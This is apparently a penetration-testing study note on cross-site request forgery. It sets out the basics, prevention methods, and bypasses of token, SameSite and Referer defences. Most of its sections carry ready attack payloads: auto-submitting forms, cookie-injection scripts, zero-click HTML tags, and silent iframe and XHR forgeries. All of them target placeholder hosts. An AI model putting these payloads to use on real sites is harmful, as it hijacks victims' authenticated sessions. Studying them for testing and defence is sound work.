---
tags:
  - csrf
  - Web
ref: https://johnermac.github.io/notes/ewptx/csrf/
---
---
## Basics
- Allows attackers to induce users to perform actions they don't want to perform
- Attacker circumvent the same origin policy, designed to prevent different websites from interfering with each other
- Example change personal details, transfer funds, etc.
- Because user is still authenticated on vulnerable site x, when he visits site y it can exploit his authentication and make a request from that site
**How it works?**
1. Relevant action - what attacker wants to do on the site (e.g. change password)
2. Cookie-based session handling - one or more HTTP requests and actions relies solely on session cookies to identify user making request
3. No unpredictable request parameters - e.g. not vulnerable if user needs to know the value of existing password
---
## CSRF Attack Example
**Change email address**
```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```
**ATTACK**
```html
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
1. If victim visits attackers page this will rigger an HTTP request to vuln site
2. If user is logged onto vuln website their browser will automatically include session cookie in the request (assuming samesite cookies are not being used)
3. Vuln website processes request as normal, tretaing it as if its been made by victim, changing their email address to attackers
---
## Generate CSRF Attack
### GET (May not need controlled website)
```
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net">
```
### POST
**Burp Suite Pro CSRF PoC Generator**
1. Select request to test. Right click > engagement tools > generate CSRF POC
2. Exploit HTML generated (-cookie which will be added automatically in victims browser)
3. Tweak options to fine-tune and copy HTML Onto web page, view in browser that is logged onto vuln website and test
**Manual**
4. Use HTML below as inspiration to develop HTML code that links to website with the predefined characters
**Example Attack Code**
```html
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="new@email.com" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
---
## Deliver POST CSRF Exploit
- Similar to reflected XSS
- Victim needs to land on CSRF exploit page
	- Feeding a user a link - such as message/email/comments etc.
---
## Prevention's
1. CSRF Token - unique, secret and unpredictable value generated by server-side application and shared with client (client must include correct CSRF token in the request to perform sensitive action)
```html
<input type="text" name="csrf" id="csrf" value="<token>" hidden>
```
1. SameSite Cookies - Determines when a website cookies are included in requests originating from other websites. Lax is enforced in chrome and is the proposed standard
2. Referer-based validation - HTTP referer header to verify request origination from applications own domain (less effective than CSRF token validation)
---
## Prevention Bypass
### CSRF Token bypass
- Previous attack will be rejected
- Can also mess around with the intial request to see what parameters can be changed or modified
**Only checks if a token is present**
```html
<input type="text" name="csrf" id="csrf" value="<any-value>" hidden>
```
**Doesn't check if token is tied to the user sessions**
- Attacker obtains their own valid token and feeds it into victim user
```html
<input type="text" name="csrf" id="csrf" value="<other-user-value>" hidden>
```
**Tied to a non-session cookie**
- Attacker obtains their own valid token and cookie
- Place cookie into browser and feed token to victim
```http
POST /email/change HTTP/1.1
---SNIP--

Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

```html
<form>
	<input type="hidden" name="csrf" value="R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa">
	---SNIP-OTHER-FIELDS---
</form>
<script>
	document.cookie = "csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa; path=/; SameSite=None; Secure";
	document.forms[0].submit();
</script>
```
**Refer-based defence**
- If  application validates that the domain in the Referer starts with the expected value
- Then the attacker can place this as a subdomain of their own domain:
```html
#FROM
 <meta name="referrer" content="never">
 http://attacker-website.com/csrf-attack?vulnerable-website.com</meta>

# TO
http://vulnerable-website.com.attacker-website.com/csrf-attack
```
### App only validates POST methods
**Change to GET**
```
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```
---
### Best Prevention
1. Use csrf token and validation for every method (record server side)
---
## CSRF Advanced (makes little sense so far)
### CSRF by Injection vulnerablities
Tags supported by HTML4 and HTML5
```
http://www.w3.org/TR/REC-html40/index/attributes.html
http://www.w3.org/html/wg/drafts/html/master/index.html#attributes-1
```
REQUIRE User Interaction:
```
<href=URL>click here
<form><input formaction=URL>
<button formaction=URL>
```
DO NOT REQUIRE User Interaction:
```
<iframe src=URL>
<script src=URL>
<input type="image" src=URL alt="">
<embed src=URL>
<audio src=URL>
<video src=URL>
<source src=URL>
<video poster=URL>
<link rel="stylesheet" href=URL>
<object data=URL>
<body background=URL>
<div style="backgound:url(URL)">
<style>body { background:url(URL) } </script>
```
---
### CSRF Via POST Requests
Using only HTML, the only way to forge POST requests is with the attribute method of tah FORM:
```
<form action="somewhere" method="POST">
```
- As a result, we need to create a cloned form and then social engineer the victim into clicking the submit button.
- We can use HTML + Javascript to create a more effective attack that does not require user interaction
**Auto Submitting Form**
```
<script>document.getElementById("CSRForm").submit()</script>
```
We can use event handlers such as **onload** and **onerror** because they do not require user interaction:
```
<img src=x onerror="CSRForm.submit();">
```
in HTML5 we can use **autofocus** and the related event handler **onfocus**:

```
<input name="new" value="evil@hacker.site" autofocus onfocus="CSRForm.submit()">
```
**Perform POST requests silently**
```
<iframe style="display:none" name="CSRFrame"></iframe>

# in the form we add target="CSRFrame" 
# display the response received submitting the form in the iframe
```
Can be forged using XMLHttpReques(**XHR**) also:
```
var url="URL";
var params = "old=mycoolemail@victim.site&new=eviL@hacker.site";
var CSRF = new XMLHttpRequest();
CSRF.open("POST", url, false);
CSRF.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
CSRF.send(params)
```
Can also be done using JavaScript libraries such as JQuery:
```
$.ajax({ type: "POST", url: "URL", data: "old=mycoolemail@victim.site&new=e\siL@hacker.site",});
```